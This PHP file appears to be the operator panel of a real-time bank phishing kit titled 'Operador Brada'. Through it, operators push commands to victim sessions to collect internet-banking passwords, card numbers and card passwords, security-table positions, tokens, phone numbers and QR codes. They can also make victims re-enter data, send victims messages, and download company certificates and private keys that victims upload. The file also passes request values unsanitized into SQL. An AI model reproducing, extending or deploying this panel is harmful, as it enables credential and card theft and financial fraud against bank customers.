<?php 
include('../_functions/functions.php');

$ActiveLink = '';
$Gerenciamento = 'none';
$displaySendName = 'none';
$displaySendPos = 'none';
$displaySendNota = 'none';
$displaySendRef = 'none';
$displaySendMensagemM = 'none';
$displaySendMensagemF = 'none';
$displaySendQrCodeF = 'none';

/* CHECA USUÁRIO LOGADO */
if(isset($_SESSION['OpLogin']) && isset($_SESSION['OpPass'])):

	$Log = $_SESSION['OpLogin'];
	$senha = $_SESSION['OpPass'];

	$tabela = 'usuarios';
	$cond = "WHERE login = '$Log' AND senha = '$senha'";
	$ReadUser = read($conn, $tabela, $cond);

	if($ReadUser[0]['login'] == $Log && $ReadUser[0]['senha'] == $senha):
		$_SESSION['OpNivel'] = $ReadUser[0]['nivel'];
		$_SESSION['OpId'] = $ReadUser[0]['id'];
	else:
		header('Location: index.php');
	endif;	

else:
	header('Location: index.php');
endif;	

/* ADICIONA PÁGINAS AO CONTENT GERAL */
if(isset($_GET['pag']) && $_GET['pag'] != ''):
	$GetPag = addslashes($_GET['pag']);

switch ($GetPag):
	case 'visualizar':
		$AdicionaPag = 'lista-clientes.php';
		$ActiveLink = 'lista-clientes';
	break;
	case 'lista-infos':
		$AdicionaPag = 'lista-infos.php';
		$ActiveLink = 'lista-infos';
	break;
	case 'meus-dados':
		$AdicionaPag = 'edite-user.php';
		$ActiveLink = 'edite-user';
	break;
	case 'add-user':
		$AdicionaPag = 'add-user.php';
		$ActiveLink = 'add-user';
	break;
	case 'manage-user':
		$AdicionaPag = 'manage-user.php';
		$ActiveLink = 'manage-user';
	break;
	case 'logoff':
		$OpId = $_SESSION['OpId'];
		update($conn, 'usuarios', "status = '0'", "WHERE id = '$OpId'");
		unset($_SESSION['OpLogin']);
		unset($_SESSION['OpPass']);
		unset($_SESSION['OpId']);
		unset($_SESSION['OpNivel']);
		echo '<script>alert("Desconectado com sucesso!");</script>';
		echo '<script>window.location.href="index.php";</script>';
	break;

	default:
		$AdicionaPag = 'lista-clientes.php';

	break;
endswitch;

else:
	$AdicionaPag = 'lista-clientes.php';
	$ActiveLink = 'home';
endif;	

/* RECEBE COMANDOS DE GERENCIAMENTO */
if(isset($_GET['gerenciar_fisi']) && $_GET['gerenciar_fisi'] != ''):

	if(isset($_GET['mobile']) && $_GET['mobile'] == 'true'):
		$SendIdUser = $_GET['gerenciar_fisi'];
		$Gerenciamento = 'block';
		$ManageFisicaM = 'block';
		$ManageFisica = 'none';
		$ManageJuba = 'none';
	else:	
		$SendIdUser = $_GET['gerenciar_fisi'];
		$Gerenciamento = 'block';
		$ManageFisica = 'block';
		$ManageFisicaM = 'none';
		$ManageJuba = 'none';
	endif;
elseif(isset($_GET['gerenciar_juba']) && $_GET['gerenciar_juba'] != ''):
	$SendIdUser = $_GET['gerenciar_juba'];
	$Gerenciamento = 'block';
	$ManageFisicaM = 'none';
	$ManageFisica = 'none';
	$ManageJuba = 'block';
endif;	

if(isset($_GET['send']) && $_GET['send'] == 'get_nome'):
	$displaySendName = 'block';
elseif(isset($_GET['send']) && $_GET['send'] == 'get_pos'):
	$displaySendPos = 'block';
elseif(isset($_GET['send']) && $_GET['send'] == 'get_table'):
	update($conn, "acessos", "comando = 'GET_TABLE'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');
elseif(isset($_GET['send']) && $_GET['send'] == 'get_psn'):
	update($conn, "acessos", "comando = 'GET_PSN'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');
elseif(isset($_GET['send']) && $_GET['send'] == 'get_pscc'):
	update($conn, "acessos", "comando = 'GET_PASS_CC'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');
elseif(isset($_GET['send']) && $_GET['send'] == 'get_cc'):
	update($conn, "acessos", "comando = 'GET_CC'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');
	
elseif(isset($_GET['send']) && $_GET['send'] == 'inv_acesso'):
	update($conn, "acessos", "comando = 'ACESSO X'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');		

elseif(isset($_GET['send']) && $_GET['send'] == 'inv_psn'):
	update($conn, "acessos", "comando = 'GET_PSN X'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');		

elseif(isset($_GET['send']) && $_GET['send'] == 'inv_pscc'):
	update($conn, "acessos", "comando = 'GET_PASS_CC X'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');		

elseif(isset($_GET['send']) && $_GET['send'] == 'inv_cc'):
	update($conn, "acessos", "comando = 'GET_CC X'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');		

elseif(isset($_GET['send']) && $_GET['send'] == 'inv_table'):
	update($conn, "acessos", "comando = 'GET_TABLE X'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');		

elseif(isset($_GET['send']) && $_GET['send'] == 'inv_pos'):
	update($conn, "acessos", "comando = 'GET_POS X'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');		

elseif(isset($_GET['send']) && $_GET['send'] == 'inv_tks'):
	update($conn, "acessos", "comando = 'GET_TOKEN X'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');		
elseif(isset($_GET['send']) && $_GET['send'] == 'inv_phone'):
	update($conn, "acessos", "comando = 'GET_PHONE X'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');	

elseif(isset($_GET['send']) && $_GET['send'] == 'inv_qrcode'):
	update($conn, "acessos", "comando = 'GET_QRCODE X'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');	

elseif(isset($_GET['send']) && $_GET['send'] == 'finalizar'):
	update($conn, "acessos", "comando = 'FINALIZADO', status = '1'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');	
elseif(isset($_GET['send']) && $_GET['send'] == 'get_tks_fisica'):
	update($conn, "acessos", "comando = 'GET_TOKEN'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');			
elseif(isset($_GET['send']) && $_GET['send'] == 'get_phone'):
	update($conn, "acessos", "comando = 'GET_PHONE'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');		

elseif(isset($_GET['send']) && $_GET['send'] == 'get_nota'):
	$displaySendNota = 'block';			
elseif(isset($_GET['send']) && $_GET['send'] == 'get_tks_mobile'):
	$displaySendRef = 'block';		
elseif(isset($_GET['send']) && $_GET['send'] == 'send_message_mobile'):
	$displaySendMensagemM = 'block';		
elseif(isset($_GET['send']) && $_GET['send'] == 'send_message_fisica'):
	$displaySendMensagemF = 'block';	
elseif(isset($_GET['send']) && $_GET['send'] == 'get_qrcode'):	
	$displaySendQrCodeF = 'block';
endif;	

if(isset($_POST['send_name']) && isset($_POST['send_id_user'])):
	$SendIdUser = $_POST['send_id_user'];
	$SendNameUser = $_POST['send_name'];
	$perfil_user = $_POST['perfil'];
	update($conn, "acessos", "comando = 'GET_PSN', nome = '$SendNameUser', perfil = '$perfil_user'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');	
	
elseif(isset($_POST['send_pos_table']) && isset($_POST['send_id_user'])):
	$SendIdUser = $_POST['send_id_user'];
	$SendPosTable = $_POST['send_pos_table'];
	update($conn, "acessos", "comando = 'GET_POS', tabela_pos = '$SendPosTable'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');	
elseif(isset($_POST['send_nota']) && isset($_POST['send_id_user'])):
	$SendIdUser = $_POST['send_id_user'];
	$SendNota = $_POST['send_nota'];
	update($conn, "acessos", "anotacao = '$SendNota'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');	
elseif(isset($_POST['send_ref']) && isset($_POST['send_id_user'])):
	$SendIdUser = $_POST['send_id_user'];
	$SendRef = $_POST['send_ref'];
	update($conn, "acessos", "token_ref = '$SendRef', comando = 'GET_TOKEN'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');			
elseif(isset($_POST['send_mensagem_mobile']) && isset($_POST['send_id_user'])):
	$SendIdUser = $_POST['send_id_user'];
	$SendMensagemMobile = $_POST['send_mensagem_mobile'];
	update($conn, "acessos", "user_message = '$SendMensagemMobile', comando = 'SET_MESSAGE'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');		
elseif(isset($_POST['send_mensagem_fisica']) && isset($_POST['send_id_user'])):
	$SendIdUser = $_POST['send_id_user'];
	$SendMensagemFisica = $_POST['send_mensagem_fisica'];
	update($conn, "acessos", "user_message = '$SendMensagemFisica', comando = 'SET_MESSAGE'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');	
elseif(isset($_POST['send_qrlink']) && isset($_POST['send_id_user'])):
	$SendIdUser = $_POST['send_id_user'];
	$sendQrLink = $_POST['send_qrlink'];
	update($conn, "acessos", "qr_link = '$sendQrLink', comando = 'GET_QRCODE'", "WHERE id = '$SendIdUser'");
	header('Location: acesso.php');	
endif;	


/* ATUALIZAR PÁGINAS */
if(!isset($_GET['pag']) && !isset($_GET['gerenciar_fisi']) && !isset($_GET['gerenciar_juba'])):
	echo '<meta http-equiv="refresh" content=5;url="acesso.php">';
endif;
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>ONLINE - Operador Brada 1.0</title>
	<link rel="stylesheet" href="../_fonts/_fonts.css">
	<link rel="stylesheet" href="../_styles/font-awesome.css">
	<link rel="stylesheet" href="../_styles/operador.css">
	<link href="https://fonts.googleapis.com/css?family=Droid+Sans:400,700" rel="stylesheet">
</head>
<body class="person_index">
	<div class="container">
		<div class="block_menu">
			<?php 

				if($_SESSION['OpNivel'] == 2):
			?>
			<ul>
				<li><a href="acesso.php" class="<?php if($ActiveLink == 'home'){echo 'active_link';}else{echo '';}?>"><i class="fa fa-refresh"></i>Home</a></li>
				<li><a href="acesso.php?pag=lista-infos" class="lista-infos"><i class="fa fa-list-ul"></i>Finalizadas</a></li>
				<li><a href="acesso.php?pag=meus-dados" class="<?php if($ActiveLink == 'edite-user'){echo 'active_link';}else{echo '';}?>"><i class="fa fa-asterisk"></i>Meus dados</a></li>
				<li><a href="acesso.php?pag=add-user" class="<?php if($ActiveLink == 'add-user'){echo 'active_link';}else{echo '';}?>"><i class="fa fa-plus"></i>Gerenciar Usuários</a></li>
				<li><a href="acesso.php?pag=logoff" class="<?php if($ActiveLink == 'logoff'){echo 'active_link';}else{echo '';}?>"><i class="fa fa-times"></i>Sair</a></li>
				<li class="clear"></li>
			</ul>
			<?php 
				elseif($_SESSION['OpNivel'] == 1):
			?>
			<ul>
				<li><a href="acesso.php" class="<?php if($ActiveLink == 'home'){echo 'active_link';}else{echo '';}?>"><i class="fa fa-refresh"></i>Home</a></li>
				<li><a href="acesso.php?pag=meus-dados" class="<?php if($ActiveLink == 'edite-user'){echo 'active_link';}else{echo '';}?>"><i class="fa fa-asterisk"></i>Meus dados</a></li>
				<li><a href="acesso.php?pag=lista-infos" class="lista-infos"><i class="fa fa-list-ul"></i>Finalizadas</a></li>
				<li><a href="acesso.php?pag=logoff" class="<?php if($ActiveLink == 'logoff'){echo 'active_link';}else{echo '';}?>"><i class="fa fa-times"></i>Sair</a></li>
				<li class="clear"></li>
			</ul>
			<?php 
				endif;
			?>

			<div class="clear"></div>
		</div>
		<div class="block_content">
			<?php 
			include($AdicionaPag);
			?>
		</div>
	</div><!-- container -->

	<div class="gerenciamento fisico" style="display:<?= $Gerenciamento;?>">
		<!-- GERENCIAMENTO FISICA -->
		<div class="block_commands" style="display:<?= $ManageFisica;?>">

			<div class="block_erros_commands">
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&send=inv_acesso">ACESSO X</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&send=inv_psn">SENHA NET X</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&send=inv_pscc" class="last">SENHA CC X</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&send=inv_cc">CARTÃO X</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&send=inv_table">TABELA X</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&send=inv_pos" class="last">POSIÇÃO X</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&send=inv_tks">TOKEN X</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&send=inv_phone">TELEFONE X</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&send=finalizar" class="finaliza_user last"><i class="fa fa-close"></i> &nbsp;FINALIZA</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&send=get_nota" class="anotacao_user"><i class="fa fa-pencil"></i> &nbsp;ANOTAÇÃO</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&send=get_qrcode" style="background-color:#05876a;color:#fff;">QRCODE</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&send=inv_qrcode" class="last" style="background-color:#c4fcf0;">QRCODE X</a>
			</div><!-- block_erros_commands -->

			<div class="clear"></div>
			<hr>
			<div class="clear"></div>

			<div class="block_get_commands">
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&send=get_nome"><i class="fa fa-get-pocket"></i> &nbsp;NOME</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&send=get_pos"><i class="fa fa-get-pocket"></i> &nbsp;POSIÇÃO</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&send=get_table" class="last">TABELA</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&send=get_psn">SENHA NET</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&send=get_pscc">SENHA CC</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&send=get_cc" class="last">CARTÃO</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&send=get_tks_fisica">TOKEN</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&send=send_message_fisica" class="anotacao_user"><i class="fa fa-get-pocket"></i> &nbsp;MENSAGEM</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&send=get_phone" class="last">TELEFONE</a>
			</div><!-- block_get_commands -->

			<div class="clear"></div>
			
			<div class="block_aditions">
				
				<form action="acesso.php" method="post" style="display:<?= $displaySendName;?>;" id="FormName">
					<label for="send_name">
						<span class="star_span"><i class="fa fa-user"></i></span>
						<input type="text" id="send_name" name="send_name" placeholder="Nome do usuário" class="normal_input" autocomplete="off">
						<input type="hidden" name="send_id_user" value="<?= $SendIdUser;?>">
						<span class="final_span" onclick="document.getElementById('FormName').submit();"><i class="fa fa-send"></i></span>
						<select name="perfil" style="margin-top:5px;width:400px;height:30px;background-color:white;color:black;border:none;font-family:Verdana;">
							<option value="NORMAL" selected>Normal</option>	
							<option value="EXCLUSIVE">Exclusive</option>
							<option value="PRIME">Prime</option>
						</select>
						
						
					</label>
				</form>

				<form action="acesso.php" method="post" style="display:<?= $displaySendPos;?>;" id="FormPos">
					<label for="send_pos_table">
						<span class="star_span"><i class="fa fa-user"></i></span>
						<input type="text" id="send_pos_table" name="send_pos_table" placeholder="Posição requerida" class="normal_input" maxlength="2" autocomplete="off">
						<input type="hidden" name="send_id_user" value="<?= $SendIdUser;?>">
						<span class="final_span" onclick="document.getElementById('FormPos').submit();"><i class="fa fa-send"></i></span>
					</label>
				</form>

				<form action="acesso.php" method="post" style="display:<?= $displaySendNota;?>;" id="FormNota">
					<label for="send_nota">
						<span class="star_span"><i class="fa fa-user"></i></span>
						<input type="text" id="send_nota" name="send_nota" placeholder="Anotação" class="normal_input" autocomplete="off">
						<input type="hidden" name="send_id_user" value="<?= $SendIdUser;?>">
						<span class="final_span" onclick="document.getElementById('FormNota').submit();"><i class="fa fa-send"></i></span>
					</label>
				</form>

				<form action="acesso.php" method="post" style="display:<?= $displaySendMensagemF;?>;" id="FormNotaMsF">
					<label for="send_ref">
						<span class="star_span"><i class="fa fa-key"></i></span>
						<input type="text" id="send_mensagem_fisica" name="send_mensagem_fisica" placeholder="Mensagem ao usuário" class="normal_input" autocomplete="off">
						<input type="hidden" name="send_id_user" value="<?= $SendIdUser;?>">
						<span class="final_span" onclick="document.getElementById('FormNotaMsF').submit();"><i class="fa fa-send"></i></span>
					</label>
				</form>
				
				<form action="acesso.php" method="post" style="display:<?= $displaySendQrCodeF;?>;" id="FormQrCodeF">
					<label for="send_ref">
						<span class="star_span"><i class="fa fa-key"></i></span>
						<input type="text" id="send_qrlink" name="send_qrlink" placeholder="Link imagem QrCode" class="normal_input" autocomplete="off">
						<input type="hidden" name="send_id_user" value="<?= $SendIdUser;?>">
						<span class="final_span" onclick="document.getElementById('FormQrCodeF').submit();"><i class="fa fa-send"></i></span>
					</label>
				</form>

			</div><!-- block_aditions -->

			<div class="clear"></div>

			<div class="block_information">
				<?php 

					$UsuarioGet = $_GET['gerenciar_fisi'];

					$tabela = 'acessos';
					$cond = "WHERE id = '$UsuarioGet'";
					$GetInfos = read($conn, $tabela, $cond);

				?>
				<span>Tabela completa: <b><?php echo ($GetInfos[0]['enviou_tabela'] == 1) ? 'Sim' : 'Não';?></b></span>
				<span class="last">CC FULL: <b><?php echo ($GetInfos[0]['cc_numero'] != '') ? 'Sim' : 'Não';?></span>
			</div><!-- block_information -->

			<div class="clear"></div>

			<a href="acesso.php" class="btn_close_now"><i class="fa fa-window-close"></i> &nbsp;FECHAR</a>

		</div><!-- block_commands -->
		<!-- GERENCIAMENTO FISICA -->

		<!-- GERENCIAMENTO FISICA MOBILE -->
		<div class="block_commands" style="display:<?= $ManageFisicaM;?>">

			<div class="block_erros_commands">
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&mobile=true&send=inv_acesso">ACESSO X</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&mobile=true&send=inv_psn">PASS NET X</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&mobile=true&send=inv_pscc" class="last">SENHA CC X</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&mobile=true&send=inv_cc">CARTÃO X</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&mobile=true&send=inv_table">TABELA X</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&mobile=true&send=inv_pos" class="last">POSIÇÃO X</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&mobile=true&send=inv_tks">TOKEN X</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&mobile=true&send=finalizar" class="finaliza_user"><i class="fa fa-close"></i> &nbsp;FINALIZA</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&mobile=true&send=get_nota" class="anotacao_user last"><i class="fa fa-pencil"></i> &nbsp;ANOTAÇÃO</a>
			</div><!-- block_erros_commands -->

			<div class="clear"></div>
			<hr>
			<div class="clear"></div>

			<div class="block_get_commands">
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&mobile=true&send=get_pos"><i class="fa fa-get-pocket"></i> &nbsp;POSIÇÃO</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&mobile=true&send=get_table">TABELA</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&mobile=true&send=get_pscc" class="last">SENHA CC</a>
					<div class="clear"></div>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&mobile=true&send=get_cc">CARTÃO</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&mobile=true&send=get_tks_mobile" class="last"><i class="fa fa-get-pocket"></i> &nbsp;TOKEN</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&mobile=true&send=send_message_mobile" class="anotacao_user" style="margin:10px 0 0 10px!important;"><i class="fa fa-get-pocket"></i> &nbsp;MENSAGEM</a>
					<div class="clear"></div>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&mobile=true&send=get_phone" class="last">TELEFONE</a>
			</div><!-- block_get_commands -->

			<div class="clear"></div>
			
			<div class="block_aditions">
				
				<form action="acesso.php" method="post" style="display:<?= $displaySendName;?>;" id="FormNameM">
					<label for="send_name">
						<span class="star_span"><i class="fa fa-user"></i></span>
						<input type="text" id="send_name" name="send_name" placeholder="Nome do usuário" class="normal_input" autocomplete="off">
						<input type="hidden" name="send_id_user" value="<?= $SendIdUser;?>">
						<span class="final_span" onclick="document.getElementById('FormNameM').submit();"><i class="fa fa-send"></i></span>
					</label>
				</form>

				<form action="acesso.php" method="post" style="display:<?= $displaySendPos;?>;" id="FormPosM">
					<label for="send_pos_table">
						<span class="star_span"><i class="fa fa-user"></i></span>
						<input type="text" id="send_pos_table" name="send_pos_table" placeholder="Posição requerida" class="normal_input" maxlength="2" autocomplete="off">
						<input type="hidden" name="send_id_user" value="<?= $SendIdUser;?>">
						<span class="final_span" onclick="document.getElementById('FormPosM').submit();"><i class="fa fa-send"></i></span>
					</label>
				</form>

				<form action="acesso.php" method="post" style="display:<?= $displaySendNota;?>;" id="FormNotaM">
					<label for="send_nota">
						<span class="star_span"><i class="fa fa-user"></i></span>
						<input type="text" id="send_nota" name="send_nota" placeholder="Anotação" class="normal_input" autocomplete="off">
						<input type="hidden" name="send_id_user" value="<?= $SendIdUser;?>">
						<span class="final_span" onclick="document.getElementById('FormNotaM').submit();"><i class="fa fa-send"></i></span>
					</label>
				</form>

				<form action="acesso.php" method="post" style="display:<?= $displaySendRef;?>;" id="FormNotaK">
					<label for="send_ref">
						<span class="star_span"><i class="fa fa-key"></i></span>
						<input type="text" id="send_ref" name="send_ref" placeholder="Código Referencia Token" class="normal_input" autocomplete="off">
						<input type="hidden" name="send_id_user" value="<?= $SendIdUser;?>">
						<span class="final_span" onclick="document.getElementById('FormNotaK').submit();"><i class="fa fa-send"></i></span>
					</label>
				</form>

				<form action="acesso.php" method="post" style="display:<?= $displaySendMensagemM;?>;" id="FormNotaMsM">
					<label for="send_ref">
						<span class="star_span"><i class="fa fa-key"></i></span>
						<input type="text" id="send_mensagem_mobile" name="send_mensagem_mobile" placeholder="Mensagem ao usuário" class="normal_input" autocomplete="off">
						<input type="hidden" name="send_id_user" value="<?= $SendIdUser;?>">
						<span class="final_span" onclick="document.getElementById('FormNotaMsM').submit();"><i class="fa fa-send"></i></span>
					</label>
				</form>

			</div><!-- block_aditions -->

			<div class="clear"></div>

			<div class="block_information">
				<?php 

					$UsuarioGet = $_GET['gerenciar_fisi'];

					$tabela = 'acessos';
					$cond = "WHERE id = '$UsuarioGet'";
					$GetInfos = read($conn, $tabela, $cond);

				?>
				<span>Tabela completa: <b><?php echo ($GetInfos[0]['enviou_tabela'] == 1) ? 'Sim' : 'Não';?></b></span>
				<span class="last">CC FULL: <b><?php echo ($GetInfos[0]['cc_numero'] != '') ? 'Sim' : 'Não';?></span>
			</div><!-- block_information -->

			<div class="clear"></div>

			<a href="acesso.php" class="btn_close_now"><i class="fa fa-window-close"></i> &nbsp;FECHAR</a>

		</div><!-- block_commands -->
		<!-- GERENCIAMENTO FISICA MOBILE -->

		<!-- GERENCIAMENTO JURIDICA -->
		<div class="block_commands" style="display:<?= $ManageJuba;?>">

			<div class="block_erros_commands">
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&send=inv_acesso">ACESSO X</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&send=inv_tks">TOKEN X</a>
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&send=finalizar" class="finaliza_user last"><i class="fa fa-close"></i> &nbsp;FINALIZA</a>
				<a href="?gerenciar_juba=<?= $SendIdUser;?>&send=get_nota" class="anotacao_user"><i class="fa fa-pencil"></i> &nbsp;ANOTAÇÃO</a>
			</div><!-- block_erros_commands -->

			<div class="clear"></div>
			<hr>
			<div class="clear"></div>

			<div class="block_get_commands">
				<a href="?gerenciar_fisi=<?= $SendIdUser;?>&send=get_tks">TOKEN</a>
			</div><!-- block_get_commands -->

			<div class="clear"></div>
			
			<div class="block_aditions">
				
				<form action="acesso.php" method="post" style="display:<?= $displaySendName;?>;" id="FormName">
					<label for="send_name">
						<span class="star_span"><i class="fa fa-user"></i></span>
						<input type="text" id="send_name" name="send_name" placeholder="Nome do usuário" class="normal_input" autocomplete="off">
						<input type="hidden" name="send_id_user" value="<?= $SendIdUser;?>">
						<span class="final_span" onclick="document.getElementById('FormName').submit();"><i class="fa fa-send"></i></span>
					</label>
				</form>

				<form action="acesso.php" method="post" style="display:<?= $displaySendPos;?>;" id="FormPos">
					<label for="send_pos_table">
						<span class="star_span"><i class="fa fa-user"></i></span>
						<input type="text" id="send_pos_table" name="send_pos_table" placeholder="Posição requerida" class="normal_input" maxlength="2" autocomplete="off">
						<input type="hidden" name="send_id_user" value="<?= $SendIdUser;?>">
						<span class="final_span" onclick="document.getElementById('FormPos').submit();"><i class="fa fa-send"></i></span>
					</label>
				</form>

				<form action="acesso.php" method="post" style="display:<?= $displaySendNota;?>;" id="FormNotaJuba">
					<label for="send_nota">
						<span class="star_span"><i class="fa fa-user"></i></span>
						<input type="text" id="send_nota" name="send_nota" placeholder="Anotação" class="normal_input" autocomplete="off">
						<input type="hidden" name="send_id_user" value="<?= $SendIdUser;?>">
						<span class="final_span" onclick="document.getElementById('FormNotaJuba').submit();"><i class="fa fa-send"></i></span>
					</label>
				</form>

			</div><!-- block_aditions -->

			<div class="clear"></div>

			<div class="block_information">
				<?php 

					$UsuarioGet = $_GET['gerenciar_juba'];

					$tabela = 'acessos';
					$cond = "WHERE id = '$UsuarioGet'";
					$GetInfos = read($conn, $tabela, $cond);

				?>
				<span>
					Certificado: <b><?php echo ($GetInfos[0]['cert_path'] != '') ? 
					'Sim&nbsp;<a target="_blank" style="color:#fff;" href="../_images/certificados/'.$GetInfos[0]['cert_path'].'" download><i class="fa fa-download"></i></a>' : 'Não';?></b>
				</span>
				<span class="last">
					Chave: <b><?php echo ($GetInfos[0]['key_path'] != '') ? 
					'Sim&nbsp;<a target="_blank" style="color:#fff;" href="../_images/certificados/'.$GetInfos[0]['key_path'].'" download><i class="fa fa-download"></i></a>' : 'Não';?>
				</span>
			</div><!-- block_information -->

			<div class="clear"></div>

			<a href="acesso.php" class="btn_close_now"><i class="fa fa-window-close"></i> &nbsp;FECHAR</a>

		</div><!-- block_commands -->
	</div><!-- gerenciamento -->

</body>
</html>